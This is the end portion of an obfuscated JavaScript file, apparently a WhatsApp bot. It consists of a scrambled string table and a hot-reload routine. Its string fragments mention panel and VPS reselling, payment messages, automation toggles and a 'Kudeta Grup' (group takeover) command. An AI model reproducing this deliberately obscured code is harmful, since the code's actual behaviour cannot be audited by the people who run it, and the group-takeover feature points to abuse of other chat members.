        't?apikey=',
        'liVSN',
        'd/fbdl?url',
        'n\x20:*\x20Rp',
        'vdiTX',
        'akan\x20fitur',
        'Rp5000',
        'txt',
        '\x20Ada\x20Membe',
        'HbUgY',
        'SH\x0a>\x20𝖱𝖤𝖲𝖤𝖫',
        'le\x20sukses\x20',
        'Berikut\x20ad',
        'Hostname/I',
        'subdo',
        'qHHmD',
        'yarat\x20&\x20Ke',
        'DOwdP',
        'Expired\x20pa',
        'tyl\x0aTunggu',
        'rs?page=1',
        'ZuEPx',
        'ᴛʜ\x20ᴄᴘᴀɴᴇʟ*',
        '>\x0a│\x20↝\x20ғᴀᴍɪ',
        'ASSlj',
        '\x20.ᴅᴇʟsᴇʟʟᴇ',
        'zHLbi',
        'updateBloc',
        'nput\x20anyth',
        'downloadAn',
        ':*\x0a\x0a*\x20*Use',
        'roplets',
        'oos',
        'ctl\x20start\x20',
        '5gb-v2',
        'ᴇɴᴏ\x20<\x20sᴜᴘᴘ',
        'fFpam',
        '\x0a│\x20↝\x20ᴠᴇʀsɪ',
        'root_admin',
        'database/p',
        'itial\x20admi',
        'shortlink',
        '.delpanel\x20',
        'autoread',
        'CpanelMenu',
        'ampah/',
        'el\x20tidak\x20d',
        'addseller',
        'ɪ\x0a│\x20↝\x20.ᴀᴜᴛ',
        'bHjyQ',
        'VPS\x20berhas',
        'connect',
        '#000000',
        '\x0a*Berhasil',
        'YzjUY',
        'p\x20By\x20ryzz\x20',
        'QjcWX',
        '8|2|21|4|1',
        'asi',
        'r\x20Bot\x20Seda',
        'xIYXj',
        'w:profile:',
        'ak\x20aktif!',
        ':\x20*',
        '10gb',
        'arch\x20🔍\x20]*\x0a',
        'juQRZ',
        'erver\x20pane',
        'fileName',
        'hUdiy',
        'WyORx',
        'Gikvg',
        'zvtiB',
        '\x0a*\x20*Views\x20',
        'ost\x20userna',
        '*\x20tema\x20pte',
        'SGxyi',
        'enambahkan',
        'ah\x20melewat',
        'zxlob',
        'NBJZh',
        '\x20:\x20*ᴄᴀsᴇ*\x0a',
        'logo',
        'OfGmy',
        'DZdWR',
        '\x20↝\x20.ᴊᴏɪɴɢᴄ',
        'Simple\x20Bot',
        'jasa\x20insta',
        't2.zip',
        'DN\x20to\x20use\x20',
        'te\x20:*\x20\x0aQri',
        'memory',
        '*\x20dari\x20dat',
        'xxᴜᴢᴢ\x20<\x20ʙᴇ',
        'omain:\x20',
        'upchannel',
        'RHKqP',
        'ʟᴏᴘᴇʀ\x20ᴀɢᴀʀ',
        'vhEKC',
        'viewOnce',
        '.zip\x20',
        'delrespon',
        'Username\x20f',
        't.lyo.su/q',
        'RNEpL',
        'fJkxz',
        '\x20account',
        '322299494\x0a',
        '*\x0a*\x20CPU\x20:\x20',
        'Author\x20',
        'ᴘᴍsʟɪᴅᴇʜᴛ\x0a',
        'headers',
        '↝\x20.ᴄᴘᴀɴᴇʟ\x0a',
        'rsLvh',
        'VGVTl',
        'UUUFT',
        'k\x20Tautan\x20F',
        'ᴛ\x0a│\x20↝\x20.ʀᴇʙ',
        '*autotypin',
        '0|1|2|4|3',
        'belian\x2015\x20',
        '160',
        'vps\x20hanya\x20',
        'antilink*\x20',
        '|\x20CPU\x204',
        'SchjZ',
        'grup\x20ini',
        'MATION\x20BOT',
        'dmin\x0a*\x20*Pa',
        'Follow',
        'group\x20:*\x20',
        'Kudeta\x20Gru',
        'rhCLc',
        'gan\x20kirim\x20',
        'js-confuse',
        '\x20chat',
        'ɪɴɢ\x0a│\x20↝\x20.ᴀ',
        'temukan!',
        'msg',
        'bWCbi',
        'ᴏᴜʀʟ\x0a│\x20↝\x20.',
        'DN\x20of\x20this',
        'ᴅᴍɪɴ-ᴠ2\x0a┗━',
        'eoLja',
        'yFleY',
        'sʜᴇʀᴇ\x0a│\x20↝\x20',
        'QOWLa',
        'Dana\x20Masuk',
        'mplate',
        'oto',
        'ate',
        'ready',
        'mMYiz',
        'Demote',
        'EUCOY',
        'mentionedJ',
        'cekidgc',
        'Ram\x204GB\x20||',
        'antilink'
    ];
    _0x7820 = function () {
        return _0x116979;
    };
    return _0x7820();
}
fs[_0x5b27a8(0x7ac)](file, () => {
    const _0x9941d0 = _0x5b27a8, _0x54a819 = {
            'XvFZu': function (_0x7f6c63, _0x394303) {
                return _0x7f6c63(_0x394303);
            }
        };
    fs[_0x9941d0(0xcdb) + 'e'](file), console[_0x9941d0(0xd16)](chalk[_0x9941d0(0x1f2)](_0x9941d0(0xf4c) + __filename)), delete require[_0x9941d0(0xd23)][file], _0x54a819[_0x9941d0(0xb1d)](require, file);
});